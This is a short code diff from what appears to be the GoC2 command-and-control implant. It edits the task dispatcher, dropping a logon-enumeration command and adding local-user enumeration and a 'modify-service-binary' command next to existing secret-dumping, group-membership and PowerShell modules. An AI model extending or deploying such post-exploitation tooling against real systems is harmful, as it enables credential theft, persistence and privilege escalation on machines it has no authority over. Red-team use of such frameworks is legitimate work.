@@ -25,7 +25,6 @@ import (
 	"github.com/latortuga71/GoC2/internal/modules/credentials/dumpsecrets"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/enumdrivers"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/enumlocaluser"
-	"github.com/latortuga71/GoC2/internal/modules/enumeration/enumlogons"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/enummodules"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/env"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/ifconfig"
@@ -389,10 +388,13 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = addusertogroup.AddUser(t.Args)
 	case "remove-user":
 		result, cmdError = addusertogroup.RemoveUser(t.Args)
-	case "enum-logons":
-		result, cmdError = enumlogons.EnumLogons()
 	case "powershell":
 		result, cmdError = powershell.RunPwsh(t.Args)
+	case "enum-local":
+		result = enumlocaluser.EnumLocal()
+		cmdError = nil
+	case "modify-service-binary":
+		result, cmdError = services.ModifyServiceBinary(t.Args)
 	default:
 		result, cmdError = "", errors.New("Command Not Found.")
 	}
